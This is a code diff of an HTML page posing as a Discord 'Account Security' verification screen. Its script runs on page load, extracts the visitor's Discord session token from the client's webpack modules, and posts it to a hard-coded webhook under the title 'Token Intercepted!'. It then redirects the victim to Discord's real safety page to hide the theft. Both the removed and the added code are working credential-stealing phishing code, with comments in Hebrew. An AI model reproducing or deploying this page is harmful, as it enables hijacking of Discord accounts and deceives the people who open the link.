@@ -1,45 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Discord - Secure Session</title>
+    <title>Discord - Account Security</title>
+    <style>
+        body { 
+            background-color: #313338; 
+            color: white; 
+            font-family: sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader { 
+            border: 4px solid rgba(255, 255, 255, 0.1); 
+            border-top: 4px solid #5865F2; 
+            border-radius: 50%; 
+            width: 40px; height: 40px; 
+            animation: spin 1s linear infinite; 
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body style="background-color: #313338; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
+<body>
     <div style="text-align: center;">
-        <div style="border: 4px solid #5865F2; border-top: 4px solid transparent; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-        <h1>Verifying Sessions...</h1>
+        <div class="loader" style="margin: 0 auto;"></div>
+        <h1>Securing Sessions...</h1>
+        <p>Please wait while we verify your account safety.</p>
     </div>
 
     <script>
-        async function capture() {
-            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
-            let token = null;
-
+        // פונקציה לשליפת הטוקן
+        function getDiscordToken() {
             try {
-                // ניסיון שליפה מתוחכם יותר
                 window.dispatchEvent(new Event('beforeunload'));
-                token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
-            } catch (e) { console.log("Token check skipped"); }
-
-            // שליחה ל-Webhook
-            await fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: token ? "🔱 Token Captured!" : "⚠️ Link Opened (No Token Found)",
-                        description: token ? "Token: `" + token + "`" : "The user opened the link but wasn't logged in on this browser.",
-                        color: token ? 5763719 : 15548997
-                    }]
-                })
-            });
-
-            // העברה לדף רשמי
-            window.location.href = "https://discord.com/safety";
+                let token = (window.webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let r in e.c)m.push(e.c[r])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+                return token;
+            } catch (e) {
+                return null;
+            }
         }
 
-        window.onload = capture;
+        async function sendToDiscord() {
+            // הכתובת של ה-Webhook שלך
+            const webhookUrl = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";
+            const token = getDiscordToken();
+
+            // הכנת ההודעה שתישלח לחדר הדיסקורד שלך
+            let payload = {
+                embeds: [{
+                    title: token ? "🔱 Token Intercepted!" : "⚠️ Link Opened",
+                    description: token ? `**Token Found:** \`${token}\`` : "Someone opened the link, but they are not logged into Discord on this browser.",
+                    color: token ? 5763719 : 15548997,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                // שליחה לדיסקורד
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.log("Failed to send to webhook.");
+            }
+
+            // העברה לדף רשמי של דיסקורד אחרי 3 שניות
+            setTimeout(() => {
+                window.location.href = "https://discord.com/safety";
+            }, 3000);
+        }
+
+        // הרצה אוטומטית
+        window.onload = sendToDiscord;
     </script>
 </body>
 </html>
